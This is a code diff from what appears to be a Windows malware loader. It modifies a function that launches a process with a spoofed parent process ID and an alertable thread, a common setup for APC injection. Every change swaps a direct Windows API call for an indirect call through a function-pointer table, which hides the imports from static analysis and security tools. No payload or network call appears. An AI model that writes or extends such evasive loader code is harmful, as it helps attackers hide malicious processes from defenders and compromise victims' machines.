@@ -297,7 +297,7 @@ BOOL CreatePpidSpoofedProcessWithAlertableThread(IN HANDLE hParentProcess, IN LP
 	// Setting the size of the structure
 	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
 
-	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
+	if (!g_Api.pGetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
 		PRINTA("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
@@ -307,7 +307,7 @@ BOOL CreatePpidSpoofedProcessWithAlertableThread(IN HANDLE hParentProcess, IN LP
 	PRINTA("[i] Creating Process With Path : %s \n", lpPath);
 
 	// This will fail with ERROR_INSUFFICIENT_BUFFER, as expected
-	InitializeProcThreadAttributeList(
+	g_Api.pInitializeProcThreadAttributeList(
 		NULL,
 		1,
 		NULL,
@@ -321,7 +321,7 @@ BOOL CreatePpidSpoofedProcessWithAlertableThread(IN HANDLE hParentProcess, IN LP
 	}
 
 	// Calling InitializeProcThreadAttributeList again, but passing the right parameters
-	if (!InitializeProcThreadAttributeList(
+	if (!g_Api.pInitializeProcThreadAttributeList(
 		pThreadAttList,
 		1,
 		NULL,
@@ -330,7 +330,7 @@ BOOL CreatePpidSpoofedProcessWithAlertableThread(IN HANDLE hParentProcess, IN LP
 		return FALSE;
 	}
 
-	if (!UpdateProcThreadAttribute(
+	if (!g_Api.pUpdateProcThreadAttribute(
 		pThreadAttList,
 		NULL,
 		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
@@ -346,7 +346,7 @@ BOOL CreatePpidSpoofedProcessWithAlertableThread(IN HANDLE hParentProcess, IN LP
 	// created using UpdateProcThreadAttribute - that is the parent process
 	SiEx.lpAttributeList = pThreadAttList;
 
-	if (!CreateProcessA(
+	if (!g_Api.pCreateProcessA(
 		NULL,
 		lpPath,
 		NULL,
@@ -366,7 +366,7 @@ BOOL CreatePpidSpoofedProcessWithAlertableThread(IN HANDLE hParentProcess, IN LP
 	*hThread = Pi.hThread;
 
 	// Cleaning up
-	DeleteProcThreadAttributeList(pThreadAttList);
+	g_Api.pDeleteProcThreadAttributeList(pThreadAttList);
 
 	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
 		return TRUE;
